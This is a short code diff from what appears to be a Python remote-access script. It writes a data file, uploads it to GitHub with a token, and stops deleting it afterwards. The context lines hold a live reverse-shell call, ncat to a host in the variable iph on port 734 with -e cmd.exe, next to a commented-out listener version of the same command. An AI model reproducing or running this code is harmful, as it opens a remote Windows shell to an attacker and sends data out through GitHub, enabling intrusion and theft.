@@ -84,7 +84,7 @@ def run(token):
         create_file("data.txt",stmnt)
         #subir_archivo('data.txt', stmnt )
         update_file_on_github("data.txt",token)
-        delete_file("data.txt")
+        #delete_file("data.txt")
         
         #os.system('ncat -lvp 734 -e cmd.exe')
         os.system('ncat '+ iph +' 734 -e cmd.exe')
